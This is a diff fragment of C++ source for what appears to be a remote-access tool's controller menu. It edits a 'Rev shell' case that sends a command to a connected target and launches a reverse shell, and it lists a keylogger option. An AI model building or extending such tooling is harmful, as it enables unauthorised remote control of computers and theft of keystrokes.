@@ -87,14 +87,19 @@ int main(int argc, char *argv[])
             
             case 2:                                                                     //Rev shell
             {
-                if (targetconnected && clientSocket != INVALID_SOCKET) { // VERY IMPORTANT CHECK
+                if (targetconnected && clientSocket != INVALID_SOCKET) 
+                {
                     send_data(clientSocket, 2);
-                    if (!Rev_Shell()) {
-                        cout << endl << ">> Closing Rev Shell..\n";
-                    }
-                } else {
+                    cout << ">> Sent " << endl;
+                } else
+                {
                     cout << ">> Target not connected or socket invalid!!" << endl;
+                    system("pause");
                 }
+                
+                Rev_Shell();
+
+                break;
             }
             
             case 3:                                                                     //Execute keylogger
